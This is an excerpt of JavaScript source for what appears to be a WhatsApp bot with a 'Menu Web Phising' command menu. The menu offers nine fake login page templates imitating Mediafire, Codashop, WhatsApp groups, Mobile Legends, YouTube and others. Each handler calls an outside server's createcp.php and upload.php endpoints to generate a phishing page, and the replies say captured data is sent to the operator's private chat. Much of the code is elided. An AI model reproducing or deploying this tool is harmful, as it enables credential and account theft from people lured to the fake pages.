...
case 'menu' :
   menu = `MENU CREATE WEB

┌──⭓ *Menu Web Phising*
│
│⭔ .webp1 : Mediafire Mp4
│⭔ .webp2 : Mediafire File
│⭔ .webp3 : Simontok Full Info
│⭔ .webp4 : Codashop
│⭔ .webp5 : Grupwa Chat
│⭔ .webp6 : Grupwa List
│⭔ .webp7 : Mlbb True Id
│⭔ .webp8 : Nonton Bokep
│⭔ .webp9 : Youtube Custom
│
└───────𖦹Ꜥꜥ
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/mediafire/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/mediafire/upload.php',
                    form: inputt
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/mediafire2/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/mediafire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/codashop/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/codashop/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/grupwa/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/grupwa/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/grupwa2/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/grupwa2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/mlbb/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/mlbb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/nontonbokep/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/nontonbokep/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://project.renznesia.ga/api-web/youtube/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://project.renznesia.ga/api-web/youtube/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
